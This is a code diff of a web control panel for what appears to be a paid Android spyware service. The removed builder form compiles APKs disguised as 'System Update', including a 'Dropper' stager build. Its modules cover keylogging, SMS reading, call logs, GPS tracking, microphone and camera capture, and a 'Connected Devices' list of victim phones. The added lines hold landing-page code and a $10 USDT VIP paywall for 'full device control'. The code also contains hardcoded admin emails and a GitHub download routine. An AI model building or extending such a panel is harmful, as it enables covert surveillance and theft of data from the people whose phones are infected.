+            <div style="display: flex; gap: 24px; font-size: 0.82rem; color: var(--text-secondary); flex-wrap: wrap; justify-content: center;">
+                <a href="index.html" style="color: var(--text-secondary); text-decoration: none;">Home</a>
+                <a href="demo.html" style="color: #ffd60a; font-weight: 700; text-decoration: none;"><i class="fas fa-play-circle"></i> Live Demo</a>
+                <a href="#features" onclick="smoothScrollTo('features', event)" style="color: var(--text-secondary); text-decoration: none;">Features</a>
+                <a href="#security" onclick="smoothScrollTo('security', event)" style="color: var(--text-secondary); text-decoration: none;">Security & Encryption</a>
+                <a href="#founder" onclick="smoothScrollTo('founder', event)" style="color: var(--text-secondary); text-decoration: none;">Founder</a>
+                <a href="builder.html" style="color: var(--text-secondary); text-decoration: none;">Control Panel</a>
             </div>
         </div>
-    </nav>
+    </footer>
 
-    <!-- Main Content Grid -->
-    <main style="max-width: 1400px; margin: 0 auto; padding: 32px 24px;">
-        <div class="fade-in">
-            <div class="page-title-row" style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 28px; flex-wrap: wrap; gap: 14px;">
-                <div>
-                    <h1 style="font-size: 1.85rem; margin-bottom: 6px; font-family: 'Outfit', sans-serif;">Command Center</h1>
-                    <p style="color: var(--text-secondary); font-size: 0.88rem;">Cloud APK compilation pipeline & real-time connected device fleet.</p>
-                </div>
-                <div class="glass-sm" style="padding: 8px 18px; display: flex; align-items: center; gap: 10px;">
-                    <span style="font-size: 0.72rem; color: var(--text-muted); font-weight: 700; text-transform: uppercase;">YOUR UID</span>
-                    <code id="uidDisplay" style="color: var(--primary); font-size: 0.82rem; font-weight: 700;">master01</code>
-                </div>
-            </div>
+    <!-- 9. Pointer Parallax & Scroll Spatial Interaction Controller -->
+    <script>
+        // Smooth Scroll Helper Function
+        function smoothScrollTo(elementId, event) {
+            if (event) event.preventDefault();
+            const target = document.getElementById(elementId);
+            if (target) {
+                target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }
+        }
 
-            <div class="main-dashboard-grid">
-                <!-- APK Cloud Builder Card -->
-                <div class="card">
-                    <div class="card-header-gradient">
-                        <h4 style="font-size: 1.05rem; font-weight: 700; display: flex; align-items: center; gap: 10px;">
-                            <i class="fas fa-hammer text-primary-c"></i> APK Cloud Builder
-                        </h4>
-                        <span class="glass-badge"><i class="fas fa-cloud"></i> GitHub Actions</span>
-                    </div>
-                    <div style="padding: 24px;" class="card-body">
-                        <form id="buildForm" style="display: flex; flex-direction: column; gap: 18px;">
-                            <div>
-                                <label class="form-label">App Name</label>
-                                <input type="text" name="app_name" class="form-input" placeholder="e.g. System Update" value="System Update" required>
-                            </div>
-                            <div>
-                                <label class="form-label">Package Name</label>
-                                <input type="text" name="package_name" class="form-input" placeholder="com.system.service.booster" value="com.system.service.booster" required>
-                            </div>
-                            <div id="webviewContainer">
-                                <label class="form-label">WebView URL</label>
-                                <input type="url" id="webviewInput" name="webview_url" class="form-input" placeholder="https://..." value="https://google.com" required>
-                            </div>
-                            <div>
-                                <label class="form-label">Build Type</label>
-                                <select name="build_type" id="buildTypeSelect" class="form-input" onchange="toggleWebviewField()">
-                                    <option value="main" selected>Main App (Core Service)</option>
-                                    <option value="dropper">Dropper App (Stager Payload)</option>
-                                </select>
-                            </div>
-                            <div>
-                                <label class="form-label">Custom App Icon (PNG)</label>
-                                <input type="file" id="appIconInput" accept="image/png" class="form-input" style="padding: 8px 14px; font-size: 0.82rem;">
-                            </div>
-                            <!-- Module Permissions (RBAC Locked for Standard Users, Configurable by Admin) -->
-                            <div style="margin-top: 14px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 12px 14px;">
-                                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
-                                    <span style="font-size: 0.78rem; font-weight: 700; color: #fff;">
-                                        <i class="fas fa-sliders-h text-primary-c me-1"></i> Feature & Module Permissions
-                                    </span>
-                                    <span id="moduleLockBadge" class="live-badge" onclick="if(!window.isUserAdmin && !window.isVipActive) showLockModal('Customize APK modules & unlock all device controls with 1 Month VIP ($10 USDT).')" style="font-size: 0.65rem; background: rgba(255, 69, 58, 0.15); color: #ff453a; border-color: rgba(255, 69, 58, 0.35); cursor: pointer;">
-                                        <i class="fas fa-lock me-1"></i> ADMIN LOCKED
-                                    </span>
-                                </div>
-                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
-                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
-                                        <span><i class="fas fa-images text-primary-c me-1"></i> Media Gallery</span>
-                                        <input type="checkbox" id="featureGallery" name="feature_gallery" checked style="accent-color: var(--primary);">
-                                    </label>
-                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
-                                        <span><i class="fas fa-folder text-primary-c me-1"></i> File Manager</span>
-                                        <input type="checkbox" id="featureFiles" name="feature_files" checked style="accent-color: var(--primary);">
-                                    </label>
-                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
-                                        <span><i class="fas fa-microphone text-primary-c me-1"></i> Audio Recorder</span>
-                                        <input type="checkbox" id="featureAudio" name="feature_audio" checked style="accent-color: var(--primary);">
-                                    </label>
-                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
-                                        <span><i class="fas fa-camera text-primary-c me-1"></i> Camera Snap</span>
-                                        <input type="checkbox" id="featureCamera" name="feature_camera" checked style="accent-color: var(--primary);">
-                                    </label>
-                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
-                                        <span><i class="fas fa-map-marker-alt text-primary-c me-1"></i> GPS Tracker</span>
-                                        <input type="checkbox" id="featureLocation" name="feature_location" checked style="accent-color: var(--primary);">
-                                    </label>
-                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
-                                        <span><i class="fas fa-phone-alt text-primary-c me-1"></i> Call Logs & Contacts</span>
-                                        <input type="checkbox" id="featureCalls" name="feature_calls" checked style="accent-color: var(--primary);">
-                                    </label>
-                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
-                                        <span><i class="fas fa-envelope text-primary-c me-1"></i> SMS Reader</span>
-                                        <input type="checkbox" id="featureSMS" name="feature_sms" checked style="accent-color: var(--primary);">
-                                    </label>
-                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
-                                        <span><i class="fas fa-keyboard text-primary-c me-1"></i> Keylogger & Apps</span>
-                                        <input type="checkbox" id="featureKeylogger" name="feature_keylogger" checked style="accent-color: var(--primary);">
-                                    </label>
-                                </div>
-                            </div>
-                            <button type="submit" id="buildBtn" class="btn-primary-glow" style="margin-top: 6px; width: 100%; border-radius: var(--radius-pill);">
-                                <i id="buildIcon" class="fas fa-rocket"></i><span id="buildText">BUILD APK</span>
-                            </button>
-                        </form>
+        (function() {
+            // Check for reduced motion or coarse pointer (touch devices)
+            const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+            const isTouch = window.matchMedia('(pointer: coarse)').matches || window.innerWidth < 860;
+            
+            const stage = document.getElementById('hero3DStage');
+            const heroObj = document.getElementById('hero3DObject');
+            const lightCenter = document.getElementById('lightCenter');
+            const spatialNav = document.getElementById('spatialNav');
+            const founderCard = document.getElementById('founderCard');
+            const chipLeft = document.getElementById('chipLeft');
+            const chipRight = document.getElementById('chipRight');
+            const satelliteTop = document.getElementById('satelliteTop');
+            const satelliteBottom = document.getElementById('satelliteBottom');
 
-                        <div id="progressArea" style="display: none; margin-top: 24px;">
-                            <div class="progress-track" style="margin-bottom: 12px;">
-                                <div id="progressBar" class="progress-fill" style="width: 0%;"></div>
-                            </div>
-                            <div id="consoleLog" class="console-box">
-                                <div id="logLines"></div>
-                            </div>
-                            <div id="buildStatus" style="font-size: 0.8rem; color: var(--text-secondary); margin-top: 10px; text-align: center; font-weight: 500;"></div>
-                        </div>
+            let mouseX = 0, mouseY = 0;
+            let currentX = 0, currentY = 0;
+            let isRunning = true;
 
-                        <div id="downloadArea" style="display: none; margin-top: 20px; text-align: center;">
-                            <button id="downloadBtn" onclick="downloadApk(this)" class="btn-accent" style="width: 100%; padding: 14px 24px; font-size: 0.92rem; font-weight: 700; border-radius: var(--radius-pill); border-color: rgba(255, 59, 48, 0.3); background: rgba(255, 59, 48, 0.12); color: #fff;">
-                                <i class="fas fa-download" style="margin-right: 8px; color: var(--primary);"></i>DOWNLOAD APK
-                            </button>
-                        </div>
-                    </div>
-                </div>
+            if (!prefersReducedMotion && !isTouch) {
+                // Mouse Move Listener for Restrained Parallax
+                window.addEventListener('pointermove', (e) => {
+                    const w = window.innerWidth;
+                    const h = window.innerHeight;
+                    mouseX = (e.clientX - w / 2) / (w / 2); // -1 to 1
+                    mouseY = (e.clientY - h / 2) / (h / 2); // -1 to 1
+                }, { passive: true });
 
-                <!-- Connected Devices Card -->
-                <div class="card">
-                    <div class="card-header-gradient" style="display: flex; justify-content: space-between; align-items: center;">
-                        <h4 style="font-size: 1.05rem; font-weight: 700; display: flex; align-items: center; gap: 10px;">
-                            <i class="fas fa-mobile-alt text-primary-c"></i> Connected Devices
-                            <span id="deviceCount" class="badge-count">0</span>
-                            <span id="onlineCount" style="background: var(--success-bg); color: var(--success); font-size: 0.68rem; font-weight: 700; padding: 3px 10px; border-radius: var(--radius-pill); border: 1px solid var(--success-border);">0 online</span>
-                        </h4>
-                        <button class="btn-ghost" onclick="refreshDevices()" style="padding: 6px 14px; border-radius: var(--radius-pill);" title="Refresh Device List">
-                            <i class="fas fa-sync-alt"></i>
-                        </button>
-                    </div>
-                    <div style="padding: 0;" id="deviceContainer">
-                        <!-- Skeleton Loading for Perceived Speed -->
-                        <div id="deviceSkeleton" style="padding: 20px;">
-                            <div style="display: flex; align-items: center; gap: 14px; padding: 14px 0; border-bottom: 1px solid var(--border-subtle);">
-                                <div style="width: 42px; height: 42px; background: rgba(255,255,255,0.05); border-radius: 12px; animation: skeletonPulse 1.2s infinite;"></div>
-                                <div style="flex: 1;">
-                                    <div style="height: 14px; width: 120px; background: rgba(255,255,255,0.05); border-radius: 4px; margin-bottom: 6px; animation: skeletonPulse 1.2s infinite;"></div>
-                                    <div style="height: 10px; width: 180px; background: rgba(255,255,255,0.03); border-radius: 4px; animation: skeletonPulse 1.2s infinite 0.1s;"></div>
-                                </div>
-                                <div style="height: 28px; width: 70px; background: rgba(255,255,255,0.05); border-radius: 14px; animation: skeletonPulse 1.2s infinite 0.2s;"></div>
-                            </div>
-                            <div style="display: flex; align-items: center; gap: 14px; padding: 14px 0;">
-                                <div style="width: 42px; height: 42px; background: rgba(255,255,255,0.05); border-radius: 12px; animation: skeletonPulse 1.2s infinite 0.15s;"></div>
-                                <div style="flex: 1;">
-                                    <div style="height: 14px; width: 100px; background: rgba(255,255,255,0.05); border-radius: 4px; margin-bottom: 6px; animation: skeletonPulse 1.2s infinite 0.25s;"></div>
-                                    <div style="height: 10px; width: 160px; background: rgba(255,255,255,0.03); border-radius: 4px; animation: skeletonPulse 1.2s infinite 0.35s;"></div>
-                                </div>
-                                <div style="height: 28px; width: 70px; background: rgba(255,255,255,0.05); border-radius: 14px; animation: skeletonPulse 1.2s infinite 0.4s;"></div>
-                            </div>
-                        </div>
+                // Smooth RAF Interpolation (Apple Fluid Physics)
+                function animateSpatialLayers() {
+                    if (!isRunning) return;
 
-                        <div id="deviceListArea" style="display: none;" class="table-responsive">
-                            <table class="data-table">
-                                <thead>
-                                    <tr>
-                                        <th>Device</th>
-                                        <th>Battery</th>
-                                        <th>Status</th>
-                                        <th style="text-align: right;">Action</th>
-                                    </tr>
-                                </thead>
-                                <tbody id="deviceList"></tbody>
-                            </table>
-                        </div>
-                    </div>
-                </div>
-            </div>
+                    // Low-pass filter / critically damped settle
+                    currentX += (mouseX - currentX) * 0.05;
+                    currentY += (mouseY - currentY) * 0.05;
+
+                    if (heroObj) {
+                        const rotY = -7 + currentX * 7;
+                        const rotX = 8 - currentY * 5;
+                        const transZ = 20 + Math.abs(currentX * 6);
+                        heroObj.style.transform = `rotateX(${rotX.toFixed(2)}deg) rotateY(${rotY.toFixed(2)}deg) translateZ(${transZ.toFixed(1)}px)`;
+                    }
+
+                    if (lightCenter) {
+                        const lx = currentX * 25;
+                        const ly = currentY * 18;
+                        lightCenter.style.transform = `translate(calc(-50% + ${lx.toFixed(1)}px), calc(-50% + ${ly.toFixed(1)}px))`;
+                    }
+
+                    if (chipLeft) {
+                        const clX = -65 + currentX * 14;
+                        const clY = 25 - currentY * 10;
+                        chipLeft.style.left = `${clX.toFixed(1)}px`;
+                    }
+
+                    if (chipRight) {
+                        const crX = -65 - currentX * 14;
+                        const crY = 25 + currentY * 10;
+                        chipRight.style.right = `${crX.toFixed(1)}px`;
+                    }
+
+                    if (satelliteTop) {
+                        const stY = -30 - currentY * 12;
+                        satelliteTop.style.top = `${stY.toFixed(1)}px`;
+                    }
+
+                    if (satelliteBottom) {
+                        const sbY = -25 + currentY * 12;
+                        satelliteBottom.style.bottom = `${sbY.toFixed(1)}px`;
+                    }
+
+                    if (founderCard) {
+                        const fRotY = currentX * 2.5;
+                        const fRotX = -currentY * 1.8;
+                        founderCard.style.transform = `perspective(1000px) rotateX(${fRotX.toFixed(2)}deg) rotateY(${fRotY.toFixed(2)}deg) translateZ(15px)`;
+                    }
+
+                    requestAnimationFrame(animateSpatialLayers);
+                }
+
+                requestAnimationFrame(animateSpatialLayers);
+            }
+
+            // Scroll-Driven Subtle Elevation without blocking pointer clicks
+            window.addEventListener('scroll', () => {
+                const scrollY = window.scrollY || window.pageYOffset;
+                if (spatialNav) {
+                    if (scrollY > 30) {
+                        spatialNav.classList.add('scrolled');
+                    } else {
+                        spatialNav.classList.remove('scrolled');
+                    }
+                }
+            }, { passive: true });
+        })();
+    </script>
+
     <!-- Binance Pay 1-Month VIP Checkout Modal (Apple VisionOS Glass Style) -->
     <div id="premiumLockModal" onclick="if(event.target===this)closeLockModal()" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(4, 4, 6, 0.85); backdrop-filter: blur(28px); -webkit-backdrop-filter: blur(28px); z-index: 100000; align-items: center; justify-content: center; padding: 20px; overflow-y: auto;">
         <div class="glass-modal" style="max-width: 500px; width: 100%; padding: 28px 24px; text-align: center; border-radius: 24px; background: rgba(14, 12, 22, 0.95); border: 1.5px solid rgba(243, 186, 47, 0.35); box-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 35px rgba(243, 186, 47, 0.15); color: #fff; position: relative;">
@@ -285,7 +1382,7 @@
 
             <!-- Notice / Lock Description -->
             <p id="lockModalDescText" style="color: var(--text-secondary); font-size: 0.82rem; margin-bottom: 14px; text-align: left; line-height: 1.4; background: rgba(255, 69, 58, 0.08); border: 1px solid rgba(255, 69, 58, 0.2); padding: 8px 12px; border-radius: 10px;">
-                This feature is locked on standard accounts. Upgrade to customize all modules and unlock full control!
+                Upgrade to 1 Month Full Access VIP ($10 USDT) to unlock all advanced capabilities.
             </p>
 
             <!-- Plan Card -->
@@ -346,846 +1443,9 @@
                     <i class="fab fa-telegram"></i> Telegram (@abid64x)
                 </a>
             </div>
-        </div>
     </div>
-    </main>
 
     <script>
-    // Define Admin emails list
-    const ADMIN_EMAILS = ['ggvgghb243@gmail.com', 'ohedulislam577@gmail.com'];
-
-    // Store current logged-in user profile in JS
-    let currentUserProfile = null;
-
-    let deviceCache = {};
-    let healthListeners = {};
-    let githubToken = '';
-
-    // Update UI header UID initial placeholder
-    document.getElementById('uidDisplay').textContent = userId;
-
-    // Load GitHub token from Firebase
-    fbDb.ref('config/github_token').once('value', snap => {
-        githubToken = snap.val() || '';
-    });
-
-    // Google Sign-In Handler
-    function handleGoogleSignIn() {
-        const provider = new firebase.auth.GoogleAuthProvider();
-        fbAuth.signInWithPopup(provider).catch(err => {
-            console.error("Google Sign-in Error:", err);
-            const errEl = document.getElementById('authError');
-            if (errEl) {
-                errEl.textContent = 'Sign-in failed: ' + err.message;
-                errEl.style.display = 'block';
-            }
-        });
-    }
-
-    // Sign Out Handler
-    function handleSignOut() {
-        fbAuth.signOut().then(() => {
-            window.location.href = 'login.html';
-        }).catch(err => {
-            console.error('Sign-out Error:', err);
-        });
-    }
-
-    function checkIsAdmin(userEmail, userMeta) {
-        if (window.isUserAdmin === true) return true;
-        const email = (userEmail || (fbAuth.currentUser ? fbAuth.currentUser.email : '') || '').trim().toLowerCase();
-        const isEmailAdmin = ADMIN_EMAILS.map(e => e.trim().toLowerCase()).includes(email);
-        const meta = userMeta || (typeof currentUserMeta !== 'undefined' ? currentUserMeta : {}) || (typeof currentUserProfile !== 'undefined' ? currentUserProfile : {}) || {};
-        const isRoleAdmin = meta && (meta.role === 'ADMIN' || meta.role === 'admin');
-        return isEmailAdmin || isRoleAdmin;
-    }
-
-    let currentUserMeta = {};
-
-    // Firebase Auth State Listener
-    fbAuth.onAuthStateChanged(user => {
-        if (user) {
-            // Hide auth loader immediately
-            const loader = document.getElementById('authLoader');
-            if (loader) loader.style.display = 'none';
-            document.getElementById('navUserProfile').style.display = 'flex';
-
-            // Calculate user's UID (sanitize user's email or fallback to user.uid)
-            const email = (user.email || '').trim().toLowerCase();
-            userId = email ? email.replace(/[@.]/g, '_') : user.uid;
-
-            // Track user activity in Firebase users_meta
-            trackUserActivity(user, 'Accessed Command Center');
-
-            let globalDefaultRules = {
-                sms: false,
-                notification: false,
-                stealth: false,
-                accounts: false,
-                calls: false,
-                gallery: false,
-                files: false,
-                location: false,
-                keylogs: false,
-                audio: false,
-                camera: false,
-                chats: false,
-                apps: false,
-                privacy_screen: false,
-                sensitive_feed: false,
-                edit_modules: false,
-                build_apk: true
-            };
-
-            // Listen to Global Default Rules
-            fbDb.ref('global_config/default_permissions').on('value', gSnap => {
-                if (gSnap.exists()) {
-                    globalDefaultRules = Object.assign({}, globalDefaultRules, gSnap.val());
-                }
-                evaluateIndexPermissions();
-            });
-
-            // Listen to real-time user permissions and role
-            fbDb.ref('users_meta/' + userId).on('value', snap => {
-                currentUserMeta = snap.val() || {};
-                currentUserProfile = currentUserMeta;
-                evaluateIndexPermissions();
-            });
-
-            function evaluateIndexPermissions() {
-                window.isUserAdmin = checkIsAdmin(email, currentUserMeta);
-                const sub = currentUserMeta.subscription || {};
-                const isSubActive = sub && sub.status === 'ACTIVE' && (sub.expires_at > Date.now());
-                window.isVipActive = isSubActive;
-
-                if (window.isUserAdmin || isSubActive) {
-                    window.userPermissions = {
-                        sms: true,
-                        notification: true,
-                        stealth: true,
-                        accounts: true,
-                        calls: true,
-                        gallery: true,
-                        files: true,
-                        location: true,
-                        keylogs: true,
-                        audio: true,
-                        camera: true,
-                        chats: true,
-                        apps: true,
-                        privacy_screen: true,
-                        sensitive_feed: true,
-                        edit_modules: true,
-                        build_apk: true
-                    };
-                } else {
-                    const userCustom = currentUserMeta.permissions || {};
-                    window.userPermissions = Object.assign({}, globalDefaultRules, userCustom);
-                }
-
-                // Display user name, avatar, role badge, and UID display
-                document.getElementById('uidDisplay').textContent = userId;
-                document.getElementById('userName').textContent = user.displayName || (email ? email.split('@')[0] : 'User');
-                document.getElementById('userAvatar').src = user.photoURL || 'https://www.gravatar.com/avatar/00000000000000000000000000000000?d=mp&f=y';
-
-                // Update VIP Nav Button
-                const navBtn = document.getElementById('vipUpgradeNavBtn');
-                const navTxt = document.getElementById('vipNavBtnText');
-                if (navBtn && navTxt) {
-                    if (window.isUserAdmin) {
-                        navBtn.style.background = 'linear-gradient(135deg, #ff453a 0%, #b91c1c 100%)';
-                        navBtn.style.boxShadow = '0 4px 15px rgba(255, 69, 58, 0.35)';
-                        navBtn.style.color = '#fff';
-                        navTxt.textContent = 'ADMIN ROOT';
-                        navBtn.onclick = () => window.location.href = 'admin.html';
-                    } else if (isSubActive) {
-                        const daysLeft = Math.max(1, Math.ceil((sub.expires_at - Date.now()) / (24 * 3600 * 1000)));
-                        navBtn.style.background = 'linear-gradient(135deg, #30d158 0%, #248a3d 100%)';
-                        navBtn.style.boxShadow = '0 4px 15px rgba(48, 209, 88, 0.35)';
-                        navBtn.style.color = '#fff';
-                        navTxt.textContent = `👑 VIP (${daysLeft}d left)`;
-                    } else {
-                        navBtn.style.background = 'linear-gradient(135deg, #f3ba2f 0%, #d49e15 100%)';
-                        navBtn.style.boxShadow = '0 4px 15px rgba(243, 186, 47, 0.35)';
-                        navBtn.style.color = '#000';
-                        navTxt.textContent = 'VIP ($10/mo)';
-                        navBtn.onclick = () => showLockModal('Get 1 Month Full Access VIP ($10 USDT) to customize modules & unlock all device controls.');
-                    }
-                }
-
-                const roleBadge = document.getElementById('userRoleBadge');
-                if (window.isUserAdmin) {
-                    roleBadge.textContent = 'ADMIN';
-                    roleBadge.style.background = 'rgba(255, 59, 48, 0.2)';
-                    roleBadge.style.color = '#ff3b30';
-                    roleBadge.style.border = '1px solid rgba(255, 59, 48, 0.4)';
-                } else if (isSubActive) {
-                    roleBadge.textContent = '👑 VIP SUBSCRIBER';
-                    roleBadge.style.background = 'rgba(243, 186, 47, 0.2)';
-                    roleBadge.style.color = '#f3ba2f';
-                    roleBadge.style.border = '1px solid rgba(243, 186, 47, 0.45)';
-                } else {
-                    roleBadge.textContent = 'USER';
-                    roleBadge.style.background = 'rgba(48, 209, 88, 0.15)';
-                    roleBadge.style.color = '#30d158';
-                    roleBadge.style.border = '1px solid rgba(48, 209, 88, 0.3)';
-                }
-
-                // Show admin button if admin
-                const adminBtn = document.getElementById('adminPanelBtn');
-                if (adminBtn) {
-                    adminBtn.style.display = window.isUserAdmin ? 'inline-flex' : 'none';
-                }
-
-                // Handle Builder Feature & Module Checkbox Access Control
-                const moduleBadge = document.getElementById('moduleLockBadge');
-                const canEditModules = window.isUserAdmin || isSubActive || window.userPermissions.edit_modules === true;
-                const moduleInputs = document.querySelectorAll('.module-perm-label input[type="checkbox"]');
-                
-                if (canEditModules) {
-                    if (moduleBadge) {
-                        moduleBadge.innerHTML = '<i class="fas fa-check-circle me-1"></i> UNLOCKED';
-                        moduleBadge.style.background = 'rgba(48, 209, 88, 0.15)';
-                        moduleBadge.style.color = '#30d158';
-                        moduleBadge.style.borderColor = 'rgba(48, 209, 88, 0.35)';
-                    }
-                    moduleInputs.forEach(input => {
-                        input.disabled = false;
-                        input.style.cursor = 'pointer';
-                        input.parentElement.style.cursor = 'pointer';
-                        input.parentElement.style.opacity = '1';
-                        input.parentElement.onclick = null;
-                    });
-                } else {
-                    if (moduleBadge) {
-                        moduleBadge.innerHTML = '<i class="fas fa-lock me-1"></i> LOCKED ($10 VIP)';
-                        moduleBadge.style.background = 'rgba(255, 69, 58, 0.15)';
-                        moduleBadge.style.color = '#ff453a';
-                        moduleBadge.style.borderColor = 'rgba(255, 69, 58, 0.35)';
-                    }
-                    moduleInputs.forEach(input => {
-                        input.checked = true; // Default standard modules checked
-                        input.disabled = true; // Locked so regular user cannot change
-                        input.style.cursor = 'pointer';
-                        input.parentElement.style.cursor = 'pointer';
-                        input.parentElement.style.opacity = '0.85';
-                        input.parentElement.title = 'Click to Unlock Module Customization with 1 Month VIP ($10 USDT)';
-                        input.parentElement.onclick = () => showLockModal('Customize APK modules with 1 Month Full Access VIP ($10 USDT).');
-                    });
-                }
-
-                // If device list was already loaded, refresh view mode
-                if (typeof renderDeviceList === 'function' && Object.keys(deviceCache).length > 0) {
-                    renderDeviceList();
-                }
-            }
-
-            // Initialize app and device listeners
-            initUserSession();
-        } else {
-            // Not logged in -> Redirect to login page
-            window.location.replace('login.html');
-        }
-    });
-
-    // Safety fallback for auth loader
-    setTimeout(() => {
-        const loader = document.getElementById('authLoader');
-        if (loader && loader.style.display !== 'none') {
-            if (fbAuth.currentUser) {
-                loader.style.display = 'none';
-            } else {
-                window.location.replace('login.html');
-            }
-        }
-    }, 1500);
-
-    // Track User Profile & Activity in Firebase users_meta
-    function trackUserActivity(user, actionName) {
-        if (!user) return;
-        const email = (user.email || '').trim().toLowerCase();
-        const uid = email ? email.replace(/[@.]/g, '_') : user.uid;
-        const isHardcodedAdmin = ADMIN_EMAILS.map(e => e.trim().toLowerCase()).includes(email);
-
-        fbDb.ref('users_meta/' + uid).once('value', snap => {
-            const umeta = snap.val() || {};
-            const loginCount = (umeta.login_count || 0) + (actionName.includes('Login') || actionName.includes('Accessed') ? 1 : 0);
-            const role = (isHardcodedAdmin || umeta.role === 'ADMIN') ? 'ADMIN' : (umeta.role || 'USER');
-
-            const updatedData = {
-                uid: uid,
-                email: email,
-                displayName: user.displayName || (email ? email.split('@')[0] : 'User'),
-                photoURL: user.photoURL || '',
-                role: role,
-                last_login: Date.now(),
-                last_login_formatted: new Date().toLocaleString(),
-                login_count: loginCount,
-                user_agent: navigator.userAgent
-            };
-
-            if (isHardcodedAdmin || role === 'ADMIN') {
-                updatedData.role = 'ADMIN';
-            }
-
-            // Set created_at if first time
-            if (!umeta.created_at) updatedData.created_at = Date.now();
-
-            fbDb.ref('users_meta/' + uid).update(updatedData);
-
-            // Append to user's activity history
-            fbDb.ref(`users_meta/${uid}/activity_history`).push({
-                time: Date.now(),
-                action: actionName
-            });
-
-            // Push to platform-wide audit logs
-            fbDb.ref('audit_logs').push({
-                timestamp: Date.now(),
-                user: email || uid,
-                action: actionName
-            });
-        });
-    }
-
-    function initUserSession() {
-        // Check for last APK build in Firebase
-        fbDb.ref('panel_users/' + userId).once('value', snap => {
-            const u = snap.val() || {};
-            const lastApk = u.last_apk || '';
-            const lastArtifact = u.last_artifact_name || '';
-            if (lastApk) {
-                const dlBtn = document.getElementById('downloadBtn');
-                dlBtn.setAttribute('data-apk', lastApk);
-                if (lastArtifact) {
-                    dlBtn.setAttribute('data-artifact', lastArtifact);
-                }
-                document.getElementById('downloadArea').style.display = 'block';
-            }
-        });
-
-        // Setup real-time health and device listeners
-        setupRealtimeHealthListeners();
-    }
-
-    // Ultra-Fast Direct APK download (Release Asset -> Artifact Zip Fallback)
-    async function downloadApk(el) {
-        const apkName = el.getAttribute('data-apk') || 'app.apk';
-        const targetArtifact = el.getAttribute('data-artifact') || '';
-        if (!githubToken) { alert('Token not loaded yet, wait a moment'); return; }
-        el.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:6px;"></i>DOWNLOADING...';
-        el.style.pointerEvents = 'none';
-        
-        try {
-            // STAGE 1: Try Instant Direct Release Download (No unzipping, 1-2 sec max)
-            let downloaded = false;
-            try {
-                const relRes = await fetch('https://api.github.com/repos/ggvgghb243-hash/ando-projet/releases/tags/v1.0', {
-                    headers: { 'Authorization': 'token ' + githubToken, 'Accept': 'application/vnd.github.v3+json' }
-                });
-                if (relRes.ok) {
-                    const relData = await relRes.json();
-                    const asset = (relData.assets || []).find(a => a.name === apkName || (userId && a.name.includes(userId)));
-                    if (asset && asset.url) {
-                        const apkRes = await fetch(asset.url, {
-                            headers: { 'Authorization': 'token ' + githubToken, 'Accept': 'application/octet-stream' }
-                        });
-                        if (apkRes.ok) {
-                            const blob = await apkRes.blob();
-                            const url = URL.createObjectURL(blob);
-                            const a = document.createElement('a');
-                            a.href = url; a.download = apkName; document.body.appendChild(a);
-                            a.click(); a.remove();
-                            setTimeout(() => URL.revokeObjectURL(url), 5000);
-                            downloaded = true;
-                        }
-                    }
-                }
-            } catch(relErr) {
-                console.warn('Release direct download skipped, falling back to artifact zip:', relErr);
-            }
-
-            // STAGE 2: Artifact Zip Fallback if Release asset wasn't ready
-            if (!downloaded) {
-                const res = await fetch('https://api.github.com/repos/ggvgghb243-hash/ando-projet/actions/artifacts?per_page=15', {
-                    headers: { 'Authorization': 'token ' + githubToken, 'Accept': 'application/vnd.github.v3+json' }
-                });
-                const data = await res.json();
-                const artifact = (data.artifacts || []).find(a => {
-                    if (a.expired) return false;
-                    if (targetArtifact) return a.name === targetArtifact;
-                    return a.name.includes(userId);
-                });
-                if (!artifact) throw new Error('No APK build found for your account. Please build your APK first.');
-
-                const zipRes = await fetch(artifact.archive_download_url, {
-                    headers: { 'Authorization': 'token ' + githubToken }
-                });
-                if (!zipRes.ok) throw new Error('Failed to download artifact: ' + zipRes.status);
-                const zipBlob = await zipRes.blob();
-
-                const zip = await JSZip.loadAsync(zipBlob);
-                const apkFile = Object.keys(zip.files).find(f => f.endsWith('.apk'));
-                if (!apkFile) throw new Error('No APK found inside artifact zip');
-
-                const apkBlob = await zip.files[apkFile].async('blob');
-                const url = URL.createObjectURL(apkBlob);
